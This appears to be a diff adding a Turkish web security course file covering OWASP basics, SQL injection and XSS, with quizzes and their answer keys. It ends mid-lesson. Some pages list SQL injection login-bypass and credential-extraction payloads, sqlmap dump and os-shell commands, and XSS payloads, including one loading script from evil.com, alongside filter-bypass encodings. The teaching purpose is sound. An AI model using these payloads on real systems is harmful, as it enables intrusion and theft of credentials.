@@ -1,0 +1,597 @@
+{
+    "categoryId": "9",
+    "categoryTitle": "Web Güvenliği",
+    "lessons": [
+        {
+            "id": "9_1",
+            "title": "Web Uygulama Güvenliği Temelleri",
+            "duration": "30",
+            "color": "#10b981",
+            "documents": 6,
+            "isCompleted": false,
+            "isActive": true,
+            "description": "Web uygulama güvenliğinin temel kavramlarını öğren, OWASP Top 10 güvenlik açıklarını keşfet ve web güvenlik mimarisini anla.",
+            "pages": [
+                {
+                    "id": "1",
+                    "title": "Web Güvenliği Nedir?",
+                    "content": "Web güvenliği, web uygulamalarını ve web sitelerini siber saldırılardan korumak için alınan önlemlerin tamamıdır.\r\n\r\n🌐 **Web Güvenliğinin Önemi:**\r\n• Günlük hayatımızın vazgeçilmez parçası\r\n• E-ticaret, bankacılık, sosyal medya\r\n• Kişisel ve kurumsal verilerin korunması\r\n• Finansal kayıpların önlenmesi\r\n• İtibar ve güven kaybının engellenmesi\r\n\r\n📊 **Web Güvenlik İstatistikleri:**\r\n• Her 39 saniyede bir siber saldırı\r\n• 2023'te 8 milyar veri ihlali\r\n• Web saldırılarının %43'ü küçük işletmelere\r\n• Ortalama veri ihlali maliyeti: 4.45 milyon dolar\r\n• Web uygulamaları en çok hedeflenen sistemler\r\n\r\n🎯 **Web Güvenliğinin Hedefleri:**\r\n• Veri gizliliğini korumak\r\n• Veri bütünlüğünü sağlamak\r\n• Hizmet sürekliliğini garanti etmek\r\n• Kullanıcı kimlik doğrulamasını güvence altına almak\r\n• Yetkisiz erişimi engellemek"
+                },
+                {
+                    "id": "2",
+                    "title": "Web Uygulama Mimarisi ve Güvenlik Katmanları",
+                    "content": "Web uygulamaları çok katmanlı bir mimariye sahiptir ve her katmanın kendine özgü güvenlik önlemleri vardır.\r\n\r\n🏗️ **Web Uygulama Katmanları:**\r\n• **Presentation Layer (Sunum Katmanı):**\r\n  - HTML, CSS, JavaScript\r\n  - Kullanıcı arayüzü\r\n  - Client-side güvenlik\r\n  - XSS koruması\r\n\r\n• **Application Layer (Uygulama Katmanı):**\r\n  - İş mantığı\r\n  - API'ler\r\n  - Session yönetimi\r\n  - Input validation\r\n\r\n• **Data Layer (Veri Katmanı):**\r\n  - Veritabanı\r\n  - Dosya sistemi\r\n  - SQL injection koruması\r\n  - Veri şifreleme\r\n\r\n• **Infrastructure Layer (Altyapı Katmanı):**\r\n  - Web sunucu\r\n  - İşletim sistemi\r\n  - Ağ güvenliği\r\n  - Firewall\r\n\r\n🛡️ **Güvenlik Katmanları (Defense in Depth):**\r\n• **Network Security:** Firewall, IDS/IPS\r\n• **Application Security:** WAF, Input validation\r\n• **Data Security:** Encryption, Access control\r\n• **Identity Security:** Authentication, Authorization\r\n• **Monitoring:** Logging, SIEM\r\n\r\n⚡ **Güvenlik Prensipleri:**\r\n• **Least Privilege:** Minimum yetki\r\n• **Defense in Depth:** Çok katmanlı savunma\r\n• **Fail Secure:** Hata durumunda güvenli\r\n• **Separation of Duties:** Görev ayrımı\r\n• **Security by Design:** Tasarımda güvenlik"
+                },
+                {
+                    "id": "3",
+                    "title": "OWASP Top 10 Güvenlik Açıkları",
+                    "content": "OWASP (Open Web Application Security Project) Top 10, web uygulamalarındaki en kritik güvenlik açıklarını listeler.\r\n\r\n🔴 **A01:2021 - Broken Access Control**\r\n• Yetkisiz erişim kontrolü\r\n• Kullanıcı yetkilerini aşma\r\n• Direkt object reference\r\n• Horizontal/vertical privilege escalation\r\n\r\n🔴 **A02:2021 - Cryptographic Failures**\r\n• Zayıf şifreleme algoritmaları\r\n• Şifrelenmemiş hassas veri\r\n• Zayıf hash fonksiyonları\r\n• Güvenli olmayan key management\r\n\r\n🔴 **A03:2021 - Injection**\r\n• SQL Injection\r\n• NoSQL Injection\r\n• Command Injection\r\n• LDAP Injection\r\n• XPath Injection\r\n\r\n🔴 **A04:2021 - Insecure Design**\r\n• Güvenlik tasarım hataları\r\n• Threat modeling eksikliği\r\n• Güvenlik gereksinimlerinin tanımlanmaması\r\n• Risk değerlendirme eksikliği\r\n\r\n🔴 **A05:2021 - Security Misconfiguration**\r\n• Varsayılan yapılandırmalar\r\n• Gereksiz özellikler\r\n• Hatalı güvenlik ayarları\r\n• Eksik güvenlik başlıkları\r\n\r\n🔴 **A06:2021 - Vulnerable Components**\r\n• Eski kütüphaneler\r\n• Bilinen güvenlik açıkları\r\n• Dependency vulnerabilities\r\n• Third-party risk\r\n\r\n🔴 **A07:2021 - Authentication Failures**\r\n• Zayıf kimlik doğrulama\r\n• Session management hataları\r\n• Brute force saldırıları\r\n• Multi-factor authentication eksikliği\r\n\r\n🔴 **A08:2021 - Software and Data Integrity Failures**\r\n• Supply chain attacks\r\n• Code integrity violations\r\n• Unsafe deserialization\r\n• CI/CD pipeline güvenliği\r\n\r\n🔴 **A09:2021 - Security Logging and Monitoring Failures**\r\n• Yetersiz loglama\r\n• Monitoring eksikliği\r\n• Incident response yetersizliği\r\n• SIEM entegrasyonu eksikliği\r\n\r\n🔴 **A10:2021 - Server-Side Request Forgery (SSRF)**\r\n• Internal network erişimi\r\n• Cloud metadata abuse\r\n• Port scanning\r\n• Internal service enumeration"
+                },
+                {
+                    "id": "4",
+                    "title": "Web Güvenlik Testleri ve Araçları",
+                    "content": "Web güvenlik testleri, uygulamaların güvenlik açıklarını tespit etmek için yapılan sistematik testlerdir.\r\n\r\n🔍 **Güvenlik Test Türleri:**\r\n• **Static Application Security Testing (SAST):**\r\n  - Kaynak kod analizi\r\n  - Development aşamasında\r\n  - False positive oranı yüksek\r\n  - SonarQube, Checkmarx\r\n\r\n• **Dynamic Application Security Testing (DAST):**\r\n  - Çalışan uygulama testi\r\n  - Black box testing\r\n  - Runtime analizi\r\n  - OWASP ZAP, Burp Suite\r\n\r\n• **Interactive Application Security Testing (IAST):**\r\n  - Runtime code analysis\r\n  - Düşük false positive\r\n  - Development ve test aşamasında\r\n  - Contrast Security, Hdiv\r\n\r\n• **Software Composition Analysis (SCA):**\r\n  - Third-party component analizi\r\n  - Known vulnerability detection\r\n  - License compliance\r\n  - Snyk, WhiteSource\r\n\r\n🛠️ **Web Güvenlik Araçları:**\r\n• **OWASP ZAP:**\r\n  - Ücretsiz ve açık kaynak\r\n  - Automated scanning\r\n  - Manual testing\r\n  - API testing\r\n\r\n• **Burp Suite:**\r\n  - Profesyonel araç\r\n  - Comprehensive testing\r\n  - Advanced features\r\n  - Enterprise edition\r\n\r\n• **Nessus:**\r\n  - Vulnerability scanner\r\n  - Network scanning\r\n  - Compliance checking\r\n  - Risk assessment\r\n\r\n• **Nmap:**\r\n  - Network discovery\r\n  - Port scanning\r\n  - Service enumeration\r\n  - Scripting engine\r\n\r\n📋 **Test Süreci:**\r\n1. **Planning:** Test kapsamı belirleme\r\n2. **Discovery:** Uygulama keşfi\r\n3. **Vulnerability Assessment:** Açık tespiti\r\n4. **Exploitation:** Açık sömürme\r\n5. **Reporting:** Rapor hazırlama\r\n6. **Remediation:** Düzeltme önerileri"
+                },
+                {
+                    "id": "5",
+                    "title": "Web Güvenlik Standartları ve Framework'ler",
+                    "content": "Web güvenliği için geliştirilmiş standartlar ve framework'ler, güvenli uygulama geliştirme sürecini yönlendirir.\r\n\r\n📚 **Güvenlik Standartları:**\r\n• **ISO 27001:**\r\n  - Bilgi güvenliği yönetim sistemi\r\n  - Risk yönetimi\r\n  - Sürekli iyileştirme\r\n  - Uluslararası standart\r\n\r\n• **NIST Cybersecurity Framework:**\r\n  - Identify, Protect, Detect, Respond, Recover\r\n  - Risk-based approach\r\n  - Government ve private sector\r\n  - Voluntary framework\r\n\r\n• **PCI DSS:**\r\n  - Payment card industry\r\n  - Credit card data protection\r\n  - 12 güvenlik gereksinimi\r\n  - Compliance mandatory\r\n\r\n• **SOC 2:**\r\n  - Service organization controls\r\n  - Trust principles\r\n  - Security, availability, confidentiality\r\n  - Third-party assurance\r\n\r\n🏗️ **Güvenlik Framework'leri:**\r\n• **OWASP SAMM:**\r\n  - Software Assurance Maturity Model\r\n  - 12 güvenlik pratiği\r\n  - Maturity levels\r\n  - Self-assessment\r\n\r\n• **NIST SP 800-53:**\r\n  - Security controls\r\n  - Federal information systems\r\n  - 20 control families\r\n  - Risk-based selection\r\n\r\n• **CIS Controls:**\r\n  - Critical Security Controls\r\n  - 20 basic controls\r\n  - Implementation groups\r\n  - Prioritized approach\r\n\r\n• **SANS Top 25:**\r\n  - Most dangerous software errors\r\n  - CWE (Common Weakness Enumeration)\r\n  - Programming language specific\r\n  - Prevention guidelines\r\n\r\n⚖️ **Yasal Düzenlemeler:**\r\n• **GDPR (EU):**\r\n  - Veri koruma yönetmeliği\r\n  - Privacy by design\r\n  - Data subject rights\r\n  - 4% of annual turnover fine\r\n\r\n• **CCPA (California):**\r\n  - California Consumer Privacy Act\r\n  - Consumer rights\r\n  - Data transparency\r\n  - Opt-out mechanisms\r\n\r\n• **KVKK (Turkey):**\r\n  - Kişisel Verilerin Korunması\r\n  - Veri sorumlusu yükümlülükleri\r\n  - Açık rıza\r\n  - Veri güvenliği önlemleri"
+                },
+                {
+                    "id": "6",
+                    "title": "Quiz: Web Güvenliği Temelleri",
+                    "type": "quiz",
+                    "question": "OWASP Top 10'da en kritik güvenlik açığı hangisidir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Injection",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "Broken Access Control",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "C",
+                            "text": "Security Misconfiguration",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "D",
+                            "text": "Cryptographic Failures",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "OWASP Top 10 2021'de en kritik güvenlik açığı A01:2021 - Broken Access Control'dur. Bu açık, kullanıcıların yetkilerini aşarak yetkisiz kaynaklara erişim sağlamasına neden olur."
+                }
+            ]
+        },
+        {
+            "id": "9_2",
+            "title": "SQL Injection ve Önleme Yöntemleri",
+            "duration": "35",
+            "color": "#059669",
+            "documents": 7,
+            "isCompleted": false,
+            "isActive": true,
+            "description": "SQL Injection saldırılarını öğren, farklı SQL injection türlerini keşfet ve güvenli kod yazma tekniklerini uygula.",
+            "pages": [
+                {
+                    "id": "1",
+                    "title": "SQL Injection Nedir?",
+                    "content": "SQL Injection, web uygulamalarındaki en kritik güvenlik açıklarından biridir ve veritabanı güvenliğini tehdit eder.\r\n\r\n💉 **SQL Injection Tanımı:**\r\n• Kullanıcı girdilerinin SQL sorgularına enjekte edilmesi\r\n• Veritabanı yapısının manipüle edilmesi\r\n• Yetkisiz veri erişimi ve değiştirilmesi\r\n• OWASP Top 10'da A03 sırasında\r\n\r\n🎯 **SQL Injection Hedefleri:**\r\n• Veritabanı verilerini okuma\r\n• Veri silme veya değiştirme\r\n• Sistem yöneticisi yetkileri kazanma\r\n• Dosya sistemi erişimi\r\n• İşletim sistemi komutları çalıştırma\r\n\r\n⚠️ **SQL Injection Riskleri:**\r\n• Hassas veri sızıntısı\r\n• Veri bütünlüğünün bozulması\r\n• Sistem ele geçirilmesi\r\n• Yasal ve mali sorumluluklar\r\n• İtibar kaybı\r\n\r\n📊 **SQL Injection İstatistikleri:**\r\n• Web saldırılarının %65'i SQL injection\r\n• Ortalama maliyet: 4.45 milyon dolar\r\n• Her 2 dakikada bir SQL injection saldırısı\r\n• %90'ı otomatik araçlarla yapılıyor"
+                },
+                {
+                    "id": "2",
+                    "title": "SQL Injection Türleri",
+                    "content": "SQL Injection saldırıları, farklı teknikler ve hedeflere göre çeşitli türlere ayrılır.\r\n\r\n🔴 **Union-based SQL Injection:**\r\n• UNION operatörü kullanımı\r\n• Farklı tablolardan veri çekme\r\n• Kolon sayısı eşleştirme\r\n• En yaygın tür\r\n\r\n🔴 **Error-based SQL Injection:**\r\n• Veritabanı hata mesajlarından bilgi alma\r\n• Syntax hataları oluşturma\r\n• Database schema keşfi\r\n• Hata mesajlarını analiz etme\r\n\r\n🔴 **Boolean-based Blind SQL Injection:**\r\n• TRUE/FALSE sorguları\r\n• Hata mesajı olmadan test\r\n• Karakter karakter veri çekme\r\n• Çok yavaş süreç\r\n\r\n🔴 **Time-based Blind SQL Injection:**\r\n• Zaman gecikmeli sorgular\r\n• SLEEP() veya WAITFOR komutları\r\n• Yanıt süresine göre analiz\r\n• En zor tespit edilen tür\r\n\r\n🔴 **Second-order SQL Injection:**\r\n• İlk sorguda saklanan payload\r\n• İkinci sorguda aktif hale gelme\r\n• Stored procedure'lerde\r\n• Çok tehlikeli tür\r\n\r\n🔴 **NoSQL Injection:**\r\n• MongoDB, CouchDB gibi NoSQL veritabanları\r\n• JSON tabanlı sorgular\r\n• Farklı syntax ve operatörler\r\n• Modern uygulamalarda yaygın"
+                },
+                {
+                    "id": "3",
+                    "title": "SQL Injection Saldırı Teknikleri",
+                    "content": "SQL Injection saldırıları için kullanılan temel teknikler ve payload'lar.\r\n\r\n🎯 **Temel Saldırı Teknikleri:**\r\n• **Single Quote Test:**\r\n  - ' veya \" karakteri ekleme\r\n  - Syntax hatalarını tespit etme\r\n  - En basit test yöntemi\r\n\r\n• **Comment Injection:**\r\n  - -- veya # ile sorgu sonlandırma\r\n  - Geri kalan kısmı yorum yapma\r\n  - WHERE koşullarını bypass etme\r\n\r\n• **Union Injection:**\r\n  - UNION SELECT ile veri çekme\r\n  - Kolon sayısını eşleştirme\r\n  - Farklı tablolardan bilgi alma\r\n\r\n• **Boolean Injection:**\r\n  - AND 1=1 / AND 1=2 testleri\r\n  - TRUE/FALSE yanıtları analiz etme\r\n  - Blind injection için kullanım\r\n\r\n🛠️ **Payload Örnekleri:**\r\n• **Authentication Bypass:**\r\n  - admin'--\r\n  - admin' OR '1'='1\r\n  - admin' OR 1=1--\r\n\r\n• **Data Extraction:**\r\n  - ' UNION SELECT username,password FROM users--\r\n  - ' UNION SELECT table_name FROM information_schema.tables--\r\n\r\n• **Database Information:**\r\n  - ' UNION SELECT version()--\r\n  - ' UNION SELECT database()--\r\n  - ' UNION SELECT user()--\r\n\r\n• **Time-based Tests:**\r\n  - '; WAITFOR DELAY '00:00:05'--\r\n  - '; SELECT SLEEP(5)--\r\n  - '; pg_sleep(5)--\r\n\r\n🔍 **Advanced Techniques:**\r\n• **Subquery Injection:**\r\n  - Nested sorgular kullanma\r\n  - Karmaşık veri çekme\r\n  - Conditional queries\r\n\r\n• **Stacked Queries:**\r\n  - Multiple sorgular çalıştırma\r\n  - ; ile sorgu ayırma\r\n  - DDL komutları çalıştırma\r\n\r\n• **Out-of-band Techniques:**\r\n  - DNS exfiltration\r\n  - HTTP requests\r\n  - External server'a veri gönderme"
+                },
+                {
+                    "id": "4",
+                    "title": "SQL Injection Tespit ve Test Yöntemleri",
+                    "content": "SQL Injection açıklarını tespit etmek için kullanılan yöntemler ve test araçları.\r\n\r\n🔍 **Manuel Test Yöntemleri:**\r\n• **Input Validation Testing:**\r\n  - Farklı karakterler test etme\r\n  - Special characters kullanma\r\n  - Boundary value testing\r\n  - Error message analizi\r\n\r\n• **Parameter Manipulation:**\r\n  - URL parametrelerini değiştirme\r\n  - POST data manipulation\r\n  - Cookie değerlerini test etme\r\n  - Header injection\r\n\r\n• **Error Analysis:**\r\n  - Database error mesajlarını inceleme\r\n  - Stack trace analizi\r\n  - Exception handling testleri\r\n  - Log file inceleme\r\n\r\n🛠️ **Otomatik Test Araçları:**\r\n• **SQLMap:**\r\n  - En popüler SQL injection aracı\r\n  - Otomatik payload generation\r\n  - Multiple database support\r\n  - Advanced evasion techniques\r\n\r\n• **Burp Suite:**\r\n  - Professional web testing\r\n  - SQL injection scanner\r\n  - Manual testing support\r\n  - Custom payload creation\r\n\r\n• **OWASP ZAP:**\r\n  - Free ve open source\r\n  - Automated scanning\r\n  - Manual testing tools\r\n  - API testing support\r\n\r\n• **NoSQLMap:**\r\n  - NoSQL injection testing\r\n  - MongoDB, CouchDB support\r\n  - Automated exploitation\r\n  - Data extraction\r\n\r\n📋 **Test Süreci:**\r\n1. **Reconnaissance:** Uygulama keşfi\r\n2. **Input Identification:** Girdi noktalarını bulma\r\n3. **Payload Injection:** Test payload'ları gönderme\r\n4. **Response Analysis:** Yanıtları analiz etme\r\n5. **Exploitation:** Açığı sömürme\r\n6. **Data Extraction:** Veri çekme\r\n7. **Reporting:** Rapor hazırlama"
+                },
+                {
+                    "id": "5",
+                    "title": "SQL Injection Koruması ve Önleme",
+                    "content": "SQL Injection saldırılarına karşı alınabilecek korunma yöntemleri ve güvenli kod yazma teknikleri.\r\n\r\n🛡️ **Prepared Statements (Parametrized Queries):**\r\n• **En etkili korunma yöntemi**\r\n• SQL kodunu veriden ayırma\r\n• Otomatik escaping\r\n• Tüm modern dillerde destek\r\n\r\n• **Örnek Kullanım:**\r\n  - PHP: PDO, MySQLi\r\n  - Java: PreparedStatement\r\n  - .NET: SqlCommand\r\n  - Python: psycopg2\r\n\r\n🔒 **Input Validation ve Sanitization:**\r\n• **Whitelist Approach:**\r\n  - Sadece izin verilen karakterler\r\n  - Regex pattern matching\r\n  - Data type validation\r\n  - Length restrictions\r\n\r\n• **Blacklist Approach:**\r\n  - Tehlikeli karakterleri filtreleme\r\n  - SQL keywords blocking\r\n  - Special characters escaping\r\n  - Less effective method\r\n\r\n🔐 **Database Security:**\r\n• **Least Privilege Principle:**\r\n  - Minimum gerekli yetkiler\r\n  - Read-only accounts\r\n  - Separate application accounts\r\n  - Regular permission review\r\n\r\n• **Database Hardening:**\r\n  - Default passwords değiştirme\r\n  - Unnecessary features kapatma\r\n  - Regular security updates\r\n  - Network access restrictions\r\n\r\n⚡ **Web Application Firewall (WAF):**\r\n• **SQL Injection Detection:**\r\n  - Pattern matching\r\n  - Behavioral analysis\r\n  - Machine learning\r\n  - Real-time blocking\r\n\r\n• **WAF Solutions:**\r\n  - ModSecurity\r\n  - Cloudflare\r\n  - AWS WAF\r\n  - Imperva\r\n\r\n📊 **Code Review ve Testing:**\r\n• **Static Code Analysis:**\r\n  - SonarQube\r\n  - Checkmarx\r\n  - Veracode\r\n  - CodeQL\r\n\r\n• **Dynamic Testing:**\r\n  - Penetration testing\r\n  - Automated scanning\r\n  - Manual testing\r\n  - Regular assessments"
+                },
+                {
+                    "id": "6",
+                    "title": "SQL Injection Araçları ve Pratik Uygulamalar",
+                    "content": "SQL Injection testleri için kullanılan profesyonel araçlar ve pratik uygulama örnekleri.\r\n\r\n🛠️ **SQLMap Kullanımı:**\r\n• **Temel Komutlar:**\r\n  - sqlmap -u \"http://target.com/page.php?id=1\"\r\n  - sqlmap -u \"http://target.com/page.php?id=1\" --dbs\r\n  - sqlmap -u \"http://target.com/page.php?id=1\" -D database --tables\r\n  - sqlmap -u \"http://target.com/page.php?id=1\" -D database -T users --dump\r\n\r\n• **Advanced Options:**\r\n  - --level: Test seviyesi (1-5)\r\n  - --risk: Risk seviyesi (1-3)\r\n  - --technique: Test tekniği seçimi\r\n  - --os-shell: İşletim sistemi shell'i\r\n\r\n• **Evasion Techniques:**\r\n  - --tamper: Payload obfuscation\r\n  - --random-agent: Random user agent\r\n  - --delay: Request gecikmesi\r\n  - --timeout: Timeout süresi\r\n\r\n🔧 **Burp Suite ile SQL Injection:**\r\n• **Scanner Kullanımı:**\r\n  - Otomatik vulnerability scanning\r\n  - Custom payload creation\r\n  - False positive filtering\r\n  - Detailed reporting\r\n\r\n• **Manual Testing:**\r\n  - Repeater ile test\r\n  - Intruder ile brute force\r\n  - Collaborator ile out-of-band\r\n  - Extensions ile genişletme\r\n\r\n🌐 **Pratik Test Senaryoları:**\r\n• **Login Bypass:**\r\n  - admin'--\r\n  - admin' OR '1'='1'--\r\n  - admin' UNION SELECT 1,2,3--\r\n\r\n• **Data Extraction:**\r\n  - ' UNION SELECT username,password FROM users--\r\n  - ' UNION SELECT table_name FROM information_schema.tables--\r\n  - ' UNION SELECT column_name FROM information_schema.columns--\r\n\r\n• **Database Information:**\r\n  - ' UNION SELECT version()--\r\n  - ' UNION SELECT database()--\r\n  - ' UNION SELECT user()--\r\n  - ' UNION SELECT @@version--\r\n\r\n⚠️ **Etik ve Yasal Uyarılar:**\r\n• **Sadece kendi sistemlerinizde test edin**\r\n• **Yazılı izin almadan test yapmayın**\r\n• **Penetration testing sertifikası alın**\r\n• **Responsible disclosure uygulayın**\r\n• **Test sonuçlarını güvenli saklayın**"
+                },
+                {
+                    "id": "7",
+                    "title": "Quiz: SQL Injection",
+                    "type": "quiz",
+                    "question": "SQL Injection saldırılarına karşı en etkili korunma yöntemi hangisidir?",
+                    "options": [
+                        {
+                            "id": "A",
+                            "text": "Input validation",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "B",
+                            "text": "Prepared statements",
+                            "isCorrect": true
+                        },
+                        {
+                            "id": "C",
+                            "text": "WAF kullanımı",
+                            "isCorrect": false
+                        },
+                        {
+                            "id": "D",
+                            "text": "Error handling",
+                            "isCorrect": false
+                        }
+                    ],
+                    "explanation": "Prepared statements (parametrized queries) SQL Injection saldırılarına karşı en etkili korunma yöntemidir. SQL kodunu veriden ayırarak injection saldırılarını önler."
+                }
+            ]
+        },
+        {
+            "id": "9_3",
+            "title": "XSS (Stored, Reflected, DOM)",
+            "duration": "40",
+            "color": "#047857",
+            "documents": 8,
+            "isCompleted": false,
+            "isActive": true,
+            "description": "Cross-Site Scripting saldırılarını öğren, Stored, Reflected ve DOM XSS türlerini keşfet ve korunma yöntemlerini uygula.",
+            "pages": [
+                {
+                    "id": "1",
+                    "title": "XSS (Cross-Site Scripting) Nedir?",
+                    "content": "Cross-Site Scripting (XSS), web uygulamalarındaki en yaygın güvenlik açıklarından biridir ve kullanıcı tarayıcısında zararlı kod çalıştırılmasına neden olur.\r\n\r\n🌐 **XSS Tanımı:**\r\n• Kullanıcı girdilerinin HTML/JavaScript olarak yorumlanması\r\n• Tarayıcıda zararlı script'lerin çalıştırılması\r\n• Session hijacking ve credential theft\r\n• OWASP Top 10'da A03 sırasında\r\n\r\n🎯 **XSS Saldırı Hedefleri:**\n• Kullanıcı session'larını çalma\r\n• Credential harvesting\r\n• Malware dağıtımı\r\n• Phishing saldırıları\r\n• Keylogger yerleştirme\r\n• Defacement\r\n\r\n⚠️ **XSS Riskleri:**\r\n• Kullanıcı verilerinin çalınması\r\n• Session hijacking\r\n• Malware dağıtımı\r\n• Phishing saldırıları\r\n• İtibar kaybı\r\n• Yasal sorumluluklar\r\n\r\n📊 **XSS İstatistikleri:**\r\n• Web saldırılarının %40'ı XSS\r\n• Her 3 web sitesinden 1'inde XSS açığı\r\n• Ortalama maliyet: 2.4 milyon dolar\r\n• %85'i otomatik araçlarla tespit ediliyor"
+                },
+                {
+                    "id": "2",
+                    "title": "XSS Türleri: Stored, Reflected, DOM",
+                    "content": "XSS saldırıları, zararlı kodun nasıl enjekte edildiğine ve nerede saklandığına göre üç ana türe ayrılır.\r\n\r\n🔴 **Stored XSS (Persistent XSS):**\r\n• Zararlı kod veritabanında saklanır\r\n• En tehlikeli XSS türü\r\n• Tüm kullanıcıları etkiler\r\n• Kalıcı zarar verir\r\n\r\n• **Örnek Senaryolar:**\r\n  - Yorum sistemleri\r\n  - Forum mesajları\r\n  - Profil bilgileri\r\n  - Dosya yükleme\r\n\r\n🔴 **Reflected XSS (Non-Persistent XSS):**\r\n• Zararlı kod URL'de veya form'da\r\n• Anında yansıtılır\r\n• Phishing saldırılarında kullanılır\r\n• Tek seferlik saldırı\r\n\r\n• **Örnek Senaryolar:**\r\n  - Arama sonuçları\r\n  - Hata mesajları\r\n  - URL parametreleri\r\n  - Form gönderimi\r\n\r\n🔴 **DOM-based XSS:**\r\n• Client-side JavaScript ile oluşur\r\n• Server'a gönderilmez\r\n• En zor tespit edilen tür\r\n• Modern SPA'larda yaygın\r\n\r\n• **Örnek Senaryolar:**\r\n  - URL fragment manipulation\r\n  - LocalStorage kullanımı\r\n  - Document.location\r\n  - Window.name"
+                },
+                {
+                    "id": "3",
+                    "title": "XSS Saldırı Teknikleri",
+                    "content": "XSS saldırılarında kullanılan temel teknikler ve payload örnekleri.\r\n\r\n🎯 **Temel XSS Teknikleri:**\r\n• **Script Tag Injection:**\r\n  - <script>alert('XSS')</script>\r\n  - <script src=\"http://evil.com/xss.js\"></script>\r\n\r\n• **Event Handler Injection:**\r\n  - <img src=x onerror=alert('XSS')>\r\n  - <div onmouseover=alert('XSS')>Hover me</div>\r\n  - <input onfocus=alert('XSS') autofocus>\r\n\r\n• **SVG ve MathML:**\r\n  - <svg onload=alert('XSS')>\r\n  - <iframe src=\"javascript:alert('XSS')\">\r\n\r\n🛡️ **Filtre Bypass Teknikleri:**\r\n• **Case Variation:**\r\n  - <ScRiPt>alert('XSS')</ScRiPt>\r\n  - <SCRIPT>alert('XSS')</SCRIPT>\r\n\r\n• **Encoding Techniques:**\r\n  - HTML Entity: &#60;script&#62;alert('XSS')&#60;/script&#62;\r\n  - URL Encoding: %3Cscript%3Ealert('XSS')%3C/script%3E\r\n  - Unicode: \\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e\r\n\r\n• **String Concatenation:**\r\n  - <script>alert('X'+'SS')</script>\r\n  - <script>alert(String.fromCharCode(88,83,83))</script>"
+                },
+                {
+                    "id": "4",
+                    "title": "XSS Tespit ve Test Yöntemleri",
+                    "content": "XSS açıklarını tespit etmek için kullanılan yöntemler ve test araçları.\r\n\r\n🔍 **Manuel Test Yöntemleri:**\r\n• **Input Field Testing:**\r\n  - Form alanlarına payload girişi\r\n  - URL parametrelerini test etme\r\n  - Cookie değerlerini manipüle etme\r\n  - Header injection testleri\r\n\r\n• **Output Analysis:**\r\n  - Response'da payload arama\r\n  - HTML encoding kontrolü\r\n  - JavaScript execution testi\r\n  - Context analysis\r\n\r\n🛠️ **Otomatik Test Araçları:**\r\n• **Burp Suite:**\r\n  - XSS scanner\r\n  - Manual testing tools\r\n  - Custom payload creation\r\n  - Active/Passive scanning\r\n\r\n• **OWASP ZAP:**\r\n  - Free XSS scanner\r\n  - Automated testing\r\n  - Manual testing support\r\n  - API testing\r\n\r\n• **XSStrike:**\r\n  - Advanced XSS scanner\r\n  - WAF bypass techniques\r\n  - Context-aware testing\r\n  - Machine learning"
+                },
+                {
+                    "id": "5",
+                    "title": "XSS Koruması ve Önleme",
+                    "content": "XSS saldırılarına karşı alınabilecek korunma yöntemleri.\r\n\r\n🛡️ **Input Validation ve Sanitization:**\r\n• **Whitelist Approach:**\r\n  - Sadece izin verilen karakterler\r\n  - HTML tag filtering\r\n  - Attribute whitelisting\r\n  - Content type validation\r\n\r\n• **Encoding Techniques:**\r\n  - HTML Entity Encoding\r\n  - URL Encoding\r\n  - JavaScript Encoding\r\n  - CSS Encoding\r\n\r\n🔒 **Output Encoding:**\r\n• **Context-aware Encoding:**\r\n  - HTML context: &lt; &gt; &amp; &quot; &#x27;\r\n  - JavaScript context: \\x3c \\x3e \\x22 \\x27\r\n  - CSS context: \\3c \\3e \\22 \\27\r\n  - URL context: %3C %3E %22 %27\r\n\r\n🔐 **Content Security Policy (CSP):**\r\n• **CSP Directives:**\r\n  - script-src: JavaScript kaynakları\r\n  - style-src: CSS kaynakları\r\n  - img-src: Resim kaynakları\r\n  - connect-src: AJAX istekleri\r\n\r\n⚡ **Additional Security Measures:**\r\n• **HttpOnly Cookies:**\r\n  - JavaScript'ten cookie erişimini engelleme\r\n  - XSS saldırılarında cookie koruması\r\n  - Set-Cookie: sessionid=123; HttpOnly\r\n\r\n• **SameSite Cookies:**\r\n  - CSRF koruması\r\n  - Cross-site request engelleme\r\n  - Strict, Lax, None değerleri"
+                },
+                {
+                    "id": "6",
+                    "title": "XSS Araçları ve Pratik Uygulamalar",
+                    "content": "XSS testleri için kullanılan profesyonel araçlar ve pratik uygulama örnekleri.\r\n\r\n🛠️ **XSStrike Kullanımı:**\r\n• **Temel Komutlar:**\r\n  - python3 xsstrike.py -u \"http://target.com/page.php?q=test\"\r\n  - python3 xsstrike.py -u \"http://target.com/page.php?q=test\" --crawl\r\n  - python3 xsstrike.py -u \"http://target.com/page.php?q=test\" --fuzzer\r\n\r\n🔧 **Burp Suite ile XSS Testing:**\r\n• **Scanner Kullanımı:**\r\n  - Otomatik XSS scanning\r\n  - Custom payload creation\r\n  - False positive filtering\r\n  - Detailed reporting\r\n\r\n🌐 **Pratik Test Senaryoları:**\r\n• **Search Functionality:**\r\n  - Arama sonuçlarında XSS\r\n  - Error mesajlarında XSS\r\n  - URL parametrelerinde XSS\r\n\r\n• **User Input Fields:**\r\n  - Form alanlarında XSS\r\n  - Comment sistemlerinde XSS\r\n  - Profile bilgilerinde XSS\r\n\r\n⚠️ **Etik ve Yasal Uyarılar:**\r\n• **Sadece kendi sistemlerinizde test edin**\r\n• **Yazılı izin almadan test yapmayın**\r\n• **Penetration testing sertifikası alın**\r\n• **Responsible disclosure uygulayın**"
+                },
+                {
+                    "id": "7",
+                    "title": "XSS Payload'ları ve Evasion Teknikleri",
